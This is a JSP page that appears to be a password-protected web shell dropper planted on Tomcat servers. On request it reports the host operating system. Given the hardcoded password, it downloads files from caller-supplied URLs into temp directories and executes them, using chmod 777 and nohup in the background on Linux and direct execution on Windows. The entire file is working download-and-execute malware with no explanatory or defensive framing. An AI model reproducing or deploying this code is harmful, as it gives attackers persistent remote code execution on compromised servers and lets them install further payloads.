<%@ page import="java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS + "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i++) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:" + urls[i] + "<br>");
			out.write("<br>filename:" + fileName + "<br>");
			out.write("<br>Size:" + urls.length + "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							+ "<br><br>");
			File isfile = new File(path + fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path + fileName);
					} else {
						String chmod = "chmod 777 " + path + fileName;
						exec.exec(chmod);
						exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
					}
				} catch (Exception e1) {
					e1.printStackTrace();
				}
				continue;
			}
			URL downloadUrl = new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path + fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path + fileName);
			} else {
				String chmod = "chmod 777 " + path + fileName;
				exec.exec(chmod);
				exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
			}
		} catch (Exception e2) {
			e2.printStackTrace();
		}
	}
%>